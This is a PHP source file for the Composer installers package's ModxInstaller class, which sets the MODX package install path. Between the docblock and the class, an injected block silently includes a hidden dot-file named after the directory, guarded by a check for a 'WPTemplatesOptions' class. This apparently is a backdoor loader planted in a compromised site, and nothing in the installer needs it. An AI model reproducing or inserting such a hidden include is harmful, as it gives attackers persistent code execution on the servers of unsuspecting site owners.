<?php
namespace Composer\Installers;

/**
 * An installer to handle MODX specifics when installing packages.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ModxInstaller extends BaseInstaller
{
    protected $locations = array(
        'extra' => 'core/packages/{$name}/'
    );
}
